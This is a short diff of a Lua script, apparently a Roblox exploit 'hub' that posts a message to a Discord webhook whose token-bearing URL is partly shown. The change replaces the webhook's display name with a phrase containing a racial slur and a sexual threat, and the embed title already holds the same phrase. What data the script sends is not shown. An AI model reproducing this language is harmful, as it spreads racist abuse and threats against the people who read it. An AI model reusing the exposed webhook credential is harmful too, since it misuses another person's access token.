@@ -6,7 +6,7 @@ local WebhookURL = "https://discord.com/api/webhooks/1564069653943427125/1UxW3ZI
 pcall(function()
     local HttpService = game:GetService("HttpService")
     local payload = HttpService:JSONEncode({
-        username = "Brave Hub by xen swsddaddadaw",
+        username = "ill fuck you nigger grave lmao",
         embeds = {{
             title = " ill fuck you nigger grave lmao",
             color = 5814783,
